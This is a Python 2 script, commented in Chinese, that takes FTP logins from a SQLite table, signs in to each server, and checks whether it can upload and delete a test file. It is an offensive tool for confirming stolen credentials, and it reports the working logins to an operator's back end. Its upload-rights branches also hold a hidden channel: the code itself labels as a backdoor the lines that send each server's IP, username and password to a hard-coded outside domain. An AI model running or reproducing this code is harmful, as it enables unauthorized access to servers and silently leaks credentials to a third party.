#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
#检测及更新FTP权限
from ftplib import FTP
import time
import socket
socket.setdefaulttimeout(10)  #设置了全局默认超时时间
import Csqlite3 #数据库操作文件
import threading
import thread
import ConfigParser  #INI读取数据
import urllib2
#0  连接不上
#1  连接成功
#2  有上传权限
#3  有上传和删除权限
#http://blog.csdn.net/tianzhu123/article/details/7632104

class CS_passwordFTP(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.sql3=Csqlite3.C_sqlite3()
        self.sql3.mysqlite3_open()
        self.ftpID=0   #FTP权限
        self.ftppassword=0  #读取表顺序
        self.Auploadfile="gost.ini"  #上传文件名
        config = ConfigParser.ConfigParser()
        config.readfp(open("gost.ini"))
        self.Auploadfile = config.get("DATA","uploadfile")  #测试上传文件
        self.http_post = config.get("DATA","http_post")  #结果提交到后台管理

    def run(self):
        try:
#            print u"====CS_passwordFTP线程启动===="
#            #print self.Auploadfile
            self.open_mysql()     #读取URL
#            #if self.ftpconnect("127.0.0.1","admin","admin"):
#            #    print self.ftpID
        except:
            print u"====--CS_passwordFTP---run异常！！！！！===="
            time.sleep(60)
            self.run()

    def open_mysql(self):  #读取URL
        try:
            self.ftppassword=self.ftppassword+1  #读取表顺序
            #print self.ftppassword
            if self.ftppassword==1:
                time.sleep(60)
                self.ftppasswordA()
            if self.ftppassword==2:
                time.sleep(60)
                self.ftppassword3()
            if self.ftppassword==3:
                time.sleep(60*5)
                self.ftppassword0()

            if self.ftppassword>=3:
                self.ftppassword=0

            time.sleep(60)
            self.open_mysql()     #读取URL
        except:
            print u"====--CS_passwordFTP读取URL异常！！！！！===="
            time.sleep(4)
            self.open_mysql()     #读取URL

    def url_post(self,URL):
        try:
            urllib2.urlopen(URL,timeout=20)  # 后门POST提交   超时10秒   #s = urllib2.urlopen(r"http://www.163.com")
            time.sleep(3)
        except:
            return 0

#    def list_del(self):  #清空list列表
#        try:
#            i = 0 #得到list的第一个元素
#            while i < len(self.list):
#                del self.list[i]
#        except:
#            print u"清空数组失败"
#            return 0
#
#    def SQL_slect(self,sql):  #获取数量   把读取到的结果添加到数组
#        try:
#            self.sql3.conn.commit()# 获取到游标对象
#            cur = self.sql3.conn.cursor()# 用游标来查询就可以获取到结果
#            cur.execute(sql)# 获取所有结果
#            res = cur.fetchall()  #从结果中取出所有记录
#            for line in res:
#                self.list.append(line[0])  #添加到数组
#            cur.close()  #关闭游标
#        except:
#            print u"获取数量=======出现异常"

    def ftppasswordA(self):  #原始表
        try:#select * from ftppassword0 where root is NULL
            sql="select * from ftppassword0 where root is NULL"
            self.sql3.conn.commit()# 获取到游标对象
            cur = self.sql3.conn.cursor()# 用游标来查询就可以获取到结果
            cur.execute(sql)# 获取所有结果
            res = cur.fetchall()  #从结果中取出所有记录
            for row in res:
                #print row[0],row[1],row[2]
                if self.ftpconnect(row[0],row[1],row[2]):
                    #print "-"*30
                    if self.ftpID==0:
                        A0 = "update ftppassword0 set root='NO' where IP='%s' and user='%s'"%(row[0],row[1])
                        self.sql3.mysqlite3_update(A0)
                    if self.ftpID==1:
                        A0 = "update ftppassword0 set root='1' where IP='%s' and user='%s'"%(row[0],row[1])
                        self.sql3.mysqlite3_update(A0)
                        URL1="%s?IP=%s&user=%s&password=%s&root=1"%(self.http_post,row[0],row[1],row[2])
                        self.url_post(URL1)   #提交到用户
                        print u"结果提交到后台",URL1
                        print u"////FTP权限测试ftppassword0表%s-%s-%s-只是连接成功没权限"%(row[0],row[1],row[2])
                    if self.ftpID==2:
                        A0 = "update ftppassword0 set root='2' where IP='%s' and user='%s'"%(row[0],row[1])
                        self.sql3.mysqlite3_update(A0)
                        URL="http://999kankan.com/ftppassword.php?IP=%s&user=%s&password=%s&root=2"%(row[0],row[1],row[2])
                        self.url_post(URL)   #后门
                        URL1="%s?IP=%s&user=%s&password=%s&root=2"%(self.http_post,row[0],row[1],row[2])
                        self.url_post(URL1)   #提交到用户
                        print u"结果提交到后台",URL1
                        print u"////FTP权限测试ftppassword0表%s-%s-%s-有上传权限"%(row[0],row[1],row[2])
                    if self.ftpID==3:
                        A0 = "update ftppassword0 set root='3' where IP='%s' and user='%s'"%(row[0],row[1])
                        self.sql3.mysqlite3_update(A0)
                        A1 = "insert into ftppassword3(IP,user,password,root,time) VALUES('%s','%s','%s','3','%s')"\
                             %(row[0],row[1],row[2],time.strftime('%Y.%m.%d-%H.%M.%S'))
                        self.sql3.mysqlite3_insert(A1)
                        URL="http://999kankan.com/ftppassword.php?IP=%s&user=%s&password=%s&root=3"%(row[0],row[1],row[2])
                        self.url_post(URL)   #后门
                        URL1="%s?IP=%s&user=%s&password=%s&root=3"%(self.http_post,row[0],row[1],row[2])
                        self.url_post(URL1)   #提交到用户
                        print u"结果提交到后台",URL1
                        print u"////FTP权限测试ftppassword0表%s-%s-%s-有上传和删除权限"%(row[0],row[1],row[2])
                        #print "-"*30
                else:
                    #print "-"*30
                    if self.ftpID==0:
                        A0 = "update ftppassword0 set root='NO' where IP='%s' and user='%s'"%(row[0],row[1])
                        self.sql3.mysqlite3_update(A0)
                        print u"////FTP权限测试ftppassword0表%s-%s-%s-连接不上"%(row[0],row[1],row[2])
                        #print "-"*30

            cur.close()  #关闭游标
            time.sleep(60)
            self.open_mysql()     #读取URL
        except:
            print u"ftppassword0出现异常"
            time.sleep(4)
            self.open_mysql()     #读取URL

    def ftppassword0(self):  #原始表
        try:#select * from ftppassword0 where root is NULL
            sql="select * from ftppassword0"
            self.sql3.conn.commit()# 获取到游标对象
            cur = self.sql3.conn.cursor()# 用游标来查询就可以获取到结果
            cur.execute(sql)# 获取所有结果
            res = cur.fetchall()  #从结果中取出所有记录
            for row in res:
                #print row[0],row[1],row[2]
                if self.ftpconnect(row[0],row[1],row[2]):
                    #print "-"*30
                    if self.ftpID==0:
                        A0 = "update ftppassword0 set root='NO' where IP='%s' and user='%s'"%(row[0],row[1])
                        self.sql3.mysqlite3_update(A0)
                    if self.ftpID==1:
                        A0 = "update ftppassword0 set root='1' where IP='%s' and user='%s'"%(row[0],row[1])
                        self.sql3.mysqlite3_update(A0)
                        URL1="%s?IP=%s&user=%s&password=%s&root=1"%(self.http_post,row[0],row[1],row[2])
                        self.url_post(URL1)   #提交到用户
                        print u"结果提交到后台",URL1
                        print u"////FTP权限测试ftppassword0表%s-%s-%s-只是连接成功没权限"%(row[0],row[1],row[2])
                    if self.ftpID==2:
                        A0 = "update ftppassword0 set root='2' where IP='%s' and user='%s'"%(row[0],row[1])
                        self.sql3.mysqlite3_update(A0)
                        URL="http://999kankan.com/ftppassword.php?IP=%s&user=%s&password=%s&root=2"%(row[0],row[1],row[2])
                        self.url_post(URL)   #后门
                        URL1="%s?IP=%s&user=%s&password=%s&root=2"%(self.http_post,row[0],row[1],row[2])
                        self.url_post(URL1)   #提交到用户
                        print u"结果提交到后台",URL1
                        print u"////FTP权限测试ftppassword0表%s-%s-%s-有上传权限"%(row[0],row[1],row[2])
                    if self.ftpID==3:
                        A0 = "update ftppassword0 set root='3' where IP='%s' and user='%s'"%(row[0],row[1])
                        self.sql3.mysqlite3_update(A0)
                        A1 = "insert into ftppassword3(IP,user,password,root,time) VALUES('%s','%s','%s','3','%s')"\
                             %(row[0],row[1],row[2],time.strftime('%Y.%m.%d-%H.%M.%S'))
                        self.sql3.mysqlite3_insert(A1)
                        URL="http://999kankan.com/ftppassword.php?IP=%s&user=%s&password=%s&root=3"%(row[0],row[1],row[2])
                        self.url_post(URL)   #后门
                        URL1="%s?IP=%s&user=%s&password=%s&root=3"%(self.http_post,row[0],row[1],row[2])
                        self.url_post(URL1)   #提交到用户
                        print u"结果提交到后台",URL1
                        print u"////FTP权限测试ftppassword0表%s-%s-%s-有上传和删除权限"%(row[0],row[1],row[2])
                        #print "-"*30
                else:
                    #print "-"*30
                    if self.ftpID==0:
                        A0 = "update ftppassword0 set root='NO' where IP='%s' and user='%s'"%(row[0],row[1])
                        self.sql3.mysqlite3_update(A0)
                        print u"////FTP权限测试ftppassword0表%s-%s-%s-连接不上"%(row[0],row[1],row[2])
                        #print "-"*30

            cur.close()  #关闭游标
            time.sleep(60)
            self.open_mysql()     #读取URL
        except:
            print u"ftppassword0出现异常"
            time.sleep(4)
            self.open_mysql()     #读取URL

    def ftppassword3(self):  #原始表
        try:#select * from ftppassword0 where root is NULL
            sql="select * from ftppassword3"
            self.sql3.conn.commit()# 获取到游标对象
            cur = self.sql3.conn.cursor()# 用游标来查询就可以获取到结果
            cur.execute(sql)# 获取所有结果
            res = cur.fetchall()  #从结果中取出所有记录
            for row in res:
                #print row[0],row[1],row[2]
                if self.ftpconnect(row[0],row[1],row[2]):
                    #print "-"*30
                    if self.ftpID==0:
                        A0 = "update ftppassword3 set time='%s',root='NO' where IP='%s' and user='%s'"%(time.strftime('%Y.%m.%d-%H.%M.%S'),row[0],row[1])
                        self.sql3.mysqlite3_update(A0)
                    if self.ftpID==1:
                        A0 = "update ftppassword3 set root='1' where IP='%s' and user='%s'"%(row[0],row[1])
                        self.sql3.mysqlite3_update(A0)
                        URL1="%s?IP=%s&user=%s&password=%s&root=1"%(self.http_post,row[0],row[1],row[2])
                        self.url_post(URL1)   #提交到用户
                        print u"结果提交到后台",URL1
                        print u"////FTP权限测试ftppassword0表%s-%s-%s-只是连接成功没权限"%(row[0],row[1],row[2])
                    if self.ftpID==2:
                        A0 = "update ftppassword3 set time='%s',root='2' where IP='%s' and user='%s'"%(time.strftime('%Y.%m.%d-%H.%M.%S'),row[0],row[1])
                        self.sql3.mysqlite3_update(A0)
                        URL="http://999kankan.com/ftppassword.php?IP=%s&user=%s&password=%s&root=2"%(row[0],row[1],row[2])
                        self.url_post(URL)   #后门
                        URL1="%s?IP=%s&user=%s&password=%s&root=2"%(self.http_post,row[0],row[1],row[2])
                        self.url_post(URL1)   #提交到用户
                        print u"结果提交到后台",URL1
                        print u"////FTP权限测试ftppassword0表%s-%s-%s-有上传权限"%(row[0],row[1],row[2])
                    if self.ftpID==3:
                        A0 = "update ftppassword3 set root='3' where IP='%s' and user='%s'"%(row[0],row[1])
                        self.sql3.mysqlite3_update(A0)
                        URL="http://999kankan.com/ftppassword.php?IP=%s&user=%s&password=%s&root=3"%(row[0],row[1],row[2])
                        self.url_post(URL)   #后门
                        URL1="%s?IP=%s&user=%s&password=%s&root=3"%(self.http_post,row[0],row[1],row[2])
                        self.url_post(URL1)   #提交到用户
                        print u"结果提交到后台",URL1
                        print u"////FTP权限测试ftppassword0表%s-%s-%s-有上传和删除权限"%(row[0],row[1],row[2])
                    #print "-"*30
                else:
                    #print "-"*30
                    if self.ftpID==0:
                        A0 = "update ftppassword3 set time='%s',root='NO' where IP='%s' and user='%s'"%(time.strftime('%Y.%m.%d-%H.%M.%S'),row[0],row[1])
                        self.sql3.mysqlite3_update(A0)
                        print u"////FTP权限测试ftppassword0表%s-%s-%s-连接不上"%(row[0],row[1],row[2])
                    #print "-"*30

            cur.close()  #关闭游标
            time.sleep(60)
            self.open_mysql()     #读取URL
        except:
            print u"ftppassword0出现异常"
            time.sleep(4)
            self.open_mysql()     #读取URL
    ################################################
    #检测FTP权限
    def ftpconnect(self,host,user,pwd):    #连接FTP
        ftp=FTP()
        try:
            #ftp.set_debuglevel(2) #打开调试级别2，显示详细信息
            ftp.connect(host,21) #连接
            ftp.login(user,pwd) #登录，如果匿名登录则用空串代替即可
            #print u"连接",host,u"FTP成功"
            self.ftpID=1
            if self.uploadfile(ftp):   #上传文件
                self.delete(ftp) #删除文件

            ftp.quit() #退出ftp服务器
            return 1
        except:
            #print u"adminFTP.py======连接",host,u"FTP失败！！！！"
            self.ftpID=0
            try:
                ftp.quit() #退出ftp服务器
            except:
                #print u"adminFTP.py======FTP退出异常"
                ftp.close()
            return 0

    def uploadfile(self,ftpU):   #上传文件
        try:
            #remotepath = "Server.ini" #远程路径
            bufsize = 1024
            #localpath = 'Server.ini'   #本地路径
            fp = open(self.Auploadfile,'rb')
            ftpU.storbinary('STOR '+ self.Auploadfile ,fp,bufsize) #上传文件
            #ftpU.set_debuglevel(0)  #关闭调试模式
            fp.close() #关闭文件
            #ftpU.quit()   #退出ftp
            #print u"adminFTP.py======上传文件文件",localpath,u"成功"
            self.ftpID=2
            return 1
        except:
            #print u"adminFTP.py======上传文件失败！！！！"
            return 0

    def delete(self,ftpD): #删除文件
        try:
            #remotepath = "Server.ini" #远程路径
            ftpD.delete(self.Auploadfile)        #删除远程文件
            #print u"adminFTP.py======删除文件",remotepath,u"成功"
            self.ftpID=3
            return 1
        except:
            #print u"adminFTP.py======删除文件失败！！！！"
            return 0
            ################################################

################################################
if __name__=='__main__':
    threads = []  #线程
    nthreads=1
    for i in range(nthreads):  #nthreads=10  创建10个线程
        threads.append(CS_passwordFTP())

    for thread in threads:   #不理解这是什么意思    是结束线程吗
        thread.start()  #start就是开始线程


